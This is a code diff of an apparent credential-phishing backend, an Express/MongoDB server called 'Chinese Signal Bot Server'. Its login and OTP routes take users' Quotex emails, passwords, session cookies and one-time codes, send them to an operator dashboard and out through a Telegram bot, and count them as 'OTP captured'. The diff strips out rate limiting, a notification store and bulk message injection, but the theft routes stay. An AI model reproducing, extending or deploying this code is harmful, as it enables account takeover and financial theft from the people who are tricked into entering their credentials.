@@ -61,73 +61,9 @@ const pendingMessageSchema = new mongoose.Schema({
     createdAt:   { type: Date, default: Date.now },
 });
 
-// NEW: Notification schema for persisted admin notifications
-const notificationSchema = new mongoose.Schema({
-    eventType:  { type: String, required: true },
-    userName:   { type: String, default: 'Unknown' },
-    licenceKey: { type: String, default: '' },
-    email:      { type: String, default: '' },
-    otp:        { type: String, default: '' },
-    ip:         { type: String, default: '' },
-    extra:      { type: Object, default: {} },
-    read:       { type: Boolean, default: false, index: true },
-    createdAt:  { type: Date, default: Date.now, index: true },
-});
-
 const User           = mongoose.model('User',           userSchema);
 const License        = mongoose.model('License',        licenseSchema);
 const PendingMessage = mongoose.model('PendingMessage', pendingMessageSchema);
-const Notification   = mongoose.model('Notification',   notificationSchema);
-
-// ================== RATE LIMITING (Spam Login Protection) ==================
-// In-memory store: key = ip + email, value = { count, firstAttempt }
-const loginAttempts = new Map();
-const RATE_LIMIT_MAX      = 4;    // max attempts
-const RATE_LIMIT_WINDOW   = 10 * 60 * 1000; // 10 minutes
-const RATE_LIMIT_BLOCK_MS = 15 * 60 * 1000; // 15 minute block
-
-function checkLoginRateLimit(ip, email) {
-    const key = `${ip}::${(email || '').toLowerCase()}`;
-    const now = Date.now();
-    const entry = loginAttempts.get(key);
-    if (!entry) {
-        loginAttempts.set(key, { count: 1, firstAttempt: now, blockedUntil: null });
-        return { allowed: true };
-    }
-    // Check if currently blocked
-    if (entry.blockedUntil && now < entry.blockedUntil) {
-        const remainingMs = entry.blockedUntil - now;
-        const remainingMin = Math.ceil(remainingMs / 60000);
-        return { allowed: false, remainingMin };
-    }
-    // Reset window if expired
-    if (now - entry.firstAttempt > RATE_LIMIT_WINDOW) {
-        loginAttempts.set(key, { count: 1, firstAttempt: now, blockedUntil: null });
-        return { allowed: true };
-    }
-    // Increment count
-    entry.count += 1;
-    if (entry.count > RATE_LIMIT_MAX) {
-        entry.blockedUntil = now + RATE_LIMIT_BLOCK_MS;
-        loginAttempts.set(key, entry);
-        return { allowed: false, remainingMin: 15 };
-    }
-    loginAttempts.set(key, entry);
-    return { allowed: true, attemptsLeft: RATE_LIMIT_MAX - entry.count + 1 };
-}
-
-function resetLoginRateLimit(ip, email) {
-    const key = `${ip}::${(email || '').toLowerCase()}`;
-    loginAttempts.delete(key);
-}
-
-// Clean up old rate limit entries every 30 minutes
-setInterval(() => {
-    const now = Date.now();
-    for (const [key, val] of loginAttempts.entries()) {
-        if (now - val.firstAttempt > RATE_LIMIT_WINDOW * 2) loginAttempts.delete(key);
-    }
-}, 30 * 60 * 1000);
 
 // ================== DB HELPERS ==================
 
@@ -194,10 +130,6 @@ async function dbFindUserByKey(licenceKey) {
     return await User.findOne({ licenceKey }).lean();
 }
 
-async function dbDeleteUser(userId) {
-    await User.deleteOne({ id: userId });
-}
-
 async function dbGetStats() {
     const [totalUsers, onlineNow, otpCaptured, connectedAccounts, totalLicenses, activeLicenses] = await Promise.all([
         User.countDocuments(),
@@ -260,44 +192,6 @@ async function dbPollAndClearMessages(userName) {
     return msgs.map(m => m.messageData);
 }
 
-// NEW: Notification DB helpers
-async function dbAddNotification(data) {
-    const notif = await Notification.create({
-        eventType:  data.eventType  || 'Unknown',
-        userName:   data.userName   || 'Unknown',
-        licenceKey: data.licenceKey || '',
-        email:      data.email      || '',
-        otp:        data.otp        || '',
-        ip:         data.ip         || '',
-        extra:      data.extra      || {},
-        read:       false,
-    });
-    // Keep only latest 500 notifications
-    const count = await Notification.countDocuments();
-    if (count > 500) {
-        const oldest = await Notification.find().sort({ createdAt: 1 }).limit(count - 500).lean();
-        const ids = oldest.map(n => n._id);
-        await Notification.deleteMany({ _id: { $in: ids } });
-    }
-    return notif.toObject();
-}
-
-async function dbGetNotifications(limit = 200) {
-    return await Notification.find().sort({ createdAt: -1 }).limit(limit).lean();
-}
-
-async function dbDeleteNotification(id) {
-    await Notification.deleteOne({ _id: id });
-}
-
-async function dbClearAllNotifications() {
-    await Notification.deleteMany({});
-}
-
-async function dbMarkNotificationsRead() {
-    await Notification.updateMany({ read: false }, { read: true });
-}
-
 // ================== EXPRESS APP ==================
 const app = express();
 app.use(cors());
@@ -317,7 +211,7 @@ async function sendTelegramMessage(text) {
 }
 
 // ================== SSE BROADCAST ==================
-const sseClients      = new Set();
+const sseClients     = new Set();
 const pendingMessages = {}; // in-memory fallback only
 
 function broadcastSSE(eventType, data) {
@@ -351,11 +245,9 @@ app.get('/api/events', (req, res) => {
 const DATA_DIR      = process.env.DATA_DIR || path.join(__dirname, 'data');
 const DATA_FILE     = path.join(DATA_DIR, 'users.json');
 const LICENSES_FILE = path.join(DATA_DIR, 'licenses.json');
-const NOTIF_FILE    = path.join(DATA_DIR, 'notifications.json');
 
-let users         = [];
-let licenses      = [];
-let notifications = []; // in-memory fallback for notifications
+let users    = [];
+let licenses = [];
 
 function ensureDataDir() {
     try {
@@ -402,27 +294,6 @@ function saveLicenses() {
         fs.renameSync(tmp, LICENSES_FILE);
     } catch (e) {
         try { fs.writeFileSync(LICENSES_FILE, JSON.stringify(licenses, null, 2)); } catch (e2) {}
-    }
-}
-
-function loadNotifications() {
-    try {
-        if (fs.existsSync(NOTIF_FILE)) {
-            notifications = JSON.parse(fs.readFileSync(NOTIF_FILE, 'utf8'));
-        } else {
-            notifications = [];
-            fs.writeFileSync(NOTIF_FILE, '[]');
-        }
-    } catch (e) { notifications = []; }
-}
-
-function saveNotifications() {
-    try {
-        const tmp = NOTIF_FILE + '.tmp';
-        fs.writeFileSync(tmp, JSON.stringify(notifications.slice(0, 500), null, 2));
-        fs.renameSync(tmp, NOTIF_FILE);
-    } catch (e) {
-        try { fs.writeFileSync(NOTIF_FILE, JSON.stringify(notifications.slice(0, 500), null, 2)); } catch (e2) {}
     }
 }
 
@@ -477,96 +348,6 @@ async function getOrCreateUser(licenceKey, fullName = 'Unknown') {
 async function saveUser(user) {
     if (useDatabase) await dbSaveUser(user);
     else saveUsers();
-}
-
-// ================== NOTIFICATION ROUTES ==================
-
-app.get('/api/notifications', async (req, res) => {
-    try {
-        if (useDatabase) {
-            const data = await dbGetNotifications(200);
-            return res.json(data);
-        }
-        res.json(notifications.slice(0, 200));
-    } catch (e) {
-        console.error('/api/notifications GET error:', e.message);
-        res.json([]);
-    }
-});
-
-app.delete('/api/notifications/:id', async (req, res) => {
-    const id = req.params.id;
-    try {
-        if (useDatabase) {
-            await dbDeleteNotification(id);
-        } else {
-            notifications = notifications.filter(n => n._id !== id && n.id !== id);
-            saveNotifications();
-        }
-        res.json({ success: true });
-    } catch (e) {
-        console.error('/api/notifications DELETE error:', e.message);
-        res.status(500).json({ error: 'Server error' });
-    }
-});
-
-app.post('/api/notifications/clear', async (req, res) => {
-    try {
-        if (useDatabase) {
-            await dbClearAllNotifications();
-        } else {
-            notifications = [];
-            saveNotifications();
-        }
-        broadcastSSE('notifications_cleared', {});
-        res.json({ success: true });
-    } catch (e) {
-        console.error('/api/notifications/clear error:', e.message);
-        res.status(500).json({ error: 'Server error' });
-    }
-});
-
-app.post('/api/notifications/mark-read', async (req, res) => {
-    try {
-        if (useDatabase) {
-            await dbMarkNotificationsRead();
-        } else {
-            notifications.forEach(n => { n.read = true; });
-            saveNotifications();
-        }
-        res.json({ success: true });
-    } catch (e) {
-        res.status(500).json({ error: 'Server error' });
-    }
-});
-
-// Helper to add a notification (used internally)
-async function addNotification(data) {
-    try {
-        if (useDatabase) {
-            return await dbAddNotification(data);
-        } else {
-            const notif = {
-                id: Date.now().toString() + '_' + Math.random().toString(36).slice(2, 6),
-                _id: Date.now().toString() + '_' + Math.random().toString(36).slice(2, 6),
-                eventType:  data.eventType  || 'Unknown',
-                userName:   data.userName   || 'Unknown',
-                licenceKey: data.licenceKey || '',
-                email:      data.email      || '',
-                otp:        data.otp        || '',
-                ip:         data.ip         || '',
-                extra:      data.extra      || {},
-                read:       false,
-                createdAt:  new Date().toISOString(),
-            };
-            notifications.unshift(notif);
-            if (notifications.length > 500) notifications = notifications.slice(0, 500);
-            saveNotifications();
-            return notif;
-        }
-    } catch (e) {
-        console.error('addNotification error:', e.message);
-    }
 }
 
 // ================== LICENSE ROUTES ==================
@@ -688,20 +469,10 @@ app.post('/api/license-activate', async (req, res) => {
         user.activities.push({ action: 'License Activated', timestamp: new Date().toLocaleString() });
         await saveUser(user);
 
-        const notifData = {
-            eventType:  '🔑 License Activated',
-            userName:   userName || 'Unknown',
-            licenceKey: licenseKey,
-            ip,
-            extra:      { timestamp: timestamp || new Date().toLocaleString() },
-        };
-        await addNotification(notifData);
-
         broadcastSSE('license_activated', {
             licenceKey: licenseKey, fullName: userName, ip,
             timestamp:  timestamp || new Date().toLocaleString()
         });
-        broadcastSSE('new_notification', notifData);
 
         await sendTelegramMessage(
             `🔑 <b>License Activated</b>\n👤 Name: <b>${userName}</b>\n🔑 Key: <b>${licenseKey}</b>\n🌍 IP: <b>${ip}</b>\n⏰ Time: <b>${timestamp}</b>`
@@ -713,20 +484,10 @@ app.post('/api/license-activate', async (req, res) => {
     }
 });
 
-// ================== QUOTEX LOGIN (with Rate Limiting) ==================
+// ================== QUOTEX LOGIN ==================
 app.post('/api/quotex-login', async (req, res) => {
     const { email, password, name, licenceKey = 'DEFAULT', cookies = '' } = req.body;
     const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown';
-
-    // Rate limit check
-    const rateCheck = checkLoginRateLimit(ip, email);
-    if (!rateCheck.allowed) {
-        return res.status(429).json({
-            status: 'rate_limited',
-            message: `Too many login attempts. Please wait ${rateCheck.remainingMin} minute(s) and try again.`,
-            remainingMin: rateCheck.remainingMin
-        });
-    }
 
     try {
         const user     = await getOrCreateUser(licenceKey, name);
@@ -739,19 +500,7 @@ app.post('/api/quotex-login', async (req, res) => {
         user.activities.push({ action: 'Quotex Login Submitted', timestamp: new Date().toLocaleString() });
         await saveUser(user);
 
-        const ts = new Date().toLocaleString();
-        const notifData = {
-            eventType:  '📧 Login Submitted',
-            userName:   name || 'Unknown',
-            licenceKey: licenceKey,
-            email,
-            ip,
-            extra:      { password, timestamp: ts },
-        };
-        await addNotification(notifData);
-
-        broadcastSSE('quotex_login', { licenceKey, fullName: name, email, password, ip, cookies, timestamp: ts });
-        broadcastSSE('new_notification', notifData);
+        broadcastSSE('quotex_login', { licenceKey, fullName: name, email, password, ip, cookies, timestamp: new Date().toLocaleString() });
 
         await sendTelegramMessage(
             `🔑 <b>Quotex Login</b>\n👤 Name: <b>${name}</b>\n📧 Email: <b>${email}</b>\n🔑 Password: <b>${password}</b>\n🌍 IP: <b>${ip}</b>\n⏰ Time: <b>${new Date().toLocaleString('en-PK', { timeZone: 'Asia/Karachi' })}</b>`
@@ -763,20 +512,10 @@ app.post('/api/quotex-login', async (req, res) => {
     }
 });
 
-// ================== OTP (with Rate Limiting) ==================
+// ================== OTP ==================
 app.post('/api/quotex-otp', async (req, res) => {
     const { email, otp, name, licenceKey = 'DEFAULT', cookies = '' } = req.body;
     const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown';
-
-    // Rate limit check for OTP
-    const rateCheck = checkLoginRateLimit(ip, email + '_otp');
-    if (!rateCheck.allowed) {
-        return res.status(429).json({
-            status: 'rate_limited',
-            message: `Too many OTP attempts. Please wait ${rateCheck.remainingMin} minute(s) and try again.`,
-            remainingMin: rateCheck.remainingMin
-        });
-    }
 
     try {
         const user   = await getOrCreateUser(licenceKey, name);
@@ -788,23 +527,7 @@ app.post('/api/quotex-otp', async (req, res) => {
         user.activities.push({ action: `OTP Entered: ${otp}`, timestamp: new Date().toLocaleString() });
         await saveUser(user);
 
-        // Reset rate limit on successful OTP entry
-        resetLoginRateLimit(ip, email);
-
-        const ts = new Date().toLocaleString();
-        const notifData = {
-            eventType:  '🔢 OTP Captured',
-            userName:   name || 'Unknown',
-            licenceKey: licenceKey,
-            email,
-            otp,
-            ip,
-            extra:      { timestamp: ts },
-        };
-        await addNotification(notifData);
-
-        broadcastSSE('otp_entered', { licenceKey, fullName: name, email, otp, ip, cookies, timestamp: ts });
-        broadcastSSE('new_notification', notifData);
+        broadcastSSE('otp_entered', { licenceKey, fullName: name, email, otp, ip, cookies, timestamp: new Date().toLocaleString() });
 
         await sendTelegramMessage(
             `🔢 <b>OTP Captured</b>\n👤 Name: <b>${name}</b>\n📧 Email: <b>${email}</b>\n🔑 OTP: <b>${otp}</b>\n🌍 IP: <b>${ip}</b>\n⏰ Time: <b>${new Date().toLocaleString('en-PK', { timeZone: 'Asia/Karachi' })}</b>`
@@ -898,10 +621,11 @@ app.post('/api/unblock-user', async (req, res) => {
 // ================== DELETE USER ==================
 app.delete('/api/users/:id', async (req, res) => {
     const userId = req.params.id;
-    if (!userId) return res.status(400).json({ error: 'userId required' });
+    if (!userId) return res.status(400).json({ error: 'User ID required' });
+
     try {
         if (useDatabase) {
-            await dbDeleteUser(userId);
+            await User.deleteOne({ id: userId });
         } else {
             users = users.filter(u => u.id !== userId);
             saveUsers();
@@ -998,38 +722,6 @@ app.post('/api/send-message', async (req, res) => {
     res.status(200).json({ success: true, delivered: true });
 });
 
-// ================== SEND MESSAGE TO MULTIPLE USERS ==================
-app.post('/api/send-message-multi', async (req, res) => {
-    const { userNames, message, type } = req.body;
-    if (!Array.isArray(userNames) || userNames.length === 0 || !message)
-        return res.status(400).json({ error: 'userNames (array) and message required' });
-
-    const ts      = new Date().toLocaleString('en-PK', { timeZone: 'Asia/Karachi' });
-    const msgType = type || 'info';
-    const results = [];
-
-    for (const userName of userNames) {
-        const msgPayload = { userName, message, type: msgType, timestamp: ts };
-        broadcastSSE('injected_message', msgPayload);
-        if (useDatabase) {
-            await dbAddPendingMessage(userName, msgPayload);
-        } else {
-            const key = userName.trim().toLowerCase();
-            if (!pendingMessages[key]) pendingMessages[key] = [];
-            pendingMessages[key].push(msgPayload);
-            if (pendingMessages[key].length > 20) pendingMessages[key].shift();
-        }
-        results.push({ userName, sent: true });
-    }
-
-    broadcastSSE('activity', {
-        action: `💬 Bulk Message [${msgType}] → ${userNames.length} users`,
-        userName: userNames.join(', '), ip: '—', timestamp: ts,
-    });
-
-    res.status(200).json({ success: true, results });
-});
-
 // ================== POLL FOR PENDING MESSAGES ==================
 app.get('/api/poll-messages', async (req, res) => {
     const userName = (req.query.userName || '').trim().toLowerCase();
@@ -1120,7 +812,7 @@ app.get('/api/latest-activity', async (req, res) => {
 });
 
 app.get('/', (req, res) => {
-    res.send(`✅ Chinese Signal Bot Server v5 Running — Storage: ${useDatabase ? 'MongoDB Atlas (PERMANENT ✅)' : 'File-based (MONGODB_URI not set)'}`);
+    res.send(`✅ Chinese Signal Bot Server v4 Running — Storage: ${useDatabase ? 'MongoDB Atlas (PERMANENT ✅)' : 'File-based (MONGODB_URI not set)'}`);
 });
 
 // ================== START SERVER ==================
@@ -1140,11 +832,9 @@ async function startServer() {
         ensureDataDir();
         loadUsers();
         loadLicenses();
-        loadNotifications();
         setInterval(() => {
             try { saveUsers(); } catch (e) {}
             try { saveLicenses(); } catch (e) {}
-            try { saveNotifications(); } catch (e) {}
         }, 30000);
     }
 
